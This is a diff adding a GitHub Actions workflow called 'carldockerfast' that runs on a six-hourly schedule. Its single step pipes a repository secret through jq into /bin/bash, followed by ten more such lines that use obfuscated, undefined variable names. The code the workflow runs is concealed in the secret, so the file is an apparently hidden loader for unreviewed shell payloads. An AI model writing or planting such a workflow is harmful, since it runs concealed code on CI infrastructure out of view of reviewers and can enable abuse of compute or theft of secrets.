@@ -1,0 +1,27 @@
+name: carldockerfast
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: carldockerfast
+        env:
+          b3477: ${{ secrets.b3477 }}
+        run: |
+          echo $b3477 | jq -r .p42906 | /bin/bash
+          echo $xrbwd1 | jq -r .zsq93055 | /bin/bash
+          echo $hvpgi7 | jq -r .arb8622 | /bin/bash
+          echo $sr16059 | jq -r .vot20762 | /bin/bash
+          echo $leya243 | jq -r .i7 | /bin/bash
+          echo $cwfx937 | jq -r .cwtq50079 | /bin/bash
+          echo $gcj59919 | jq -r .chad947 | /bin/bash
+          echo $at753 | jq -r .lmur3 | /bin/bash
+          echo $g19782 | jq -r .t4 | /bin/bash
+          echo $dh5 | jq -r .iv753 | /bin/bash
+          echo $bq50168 | jq -r .f33027 | /bin/bash
+
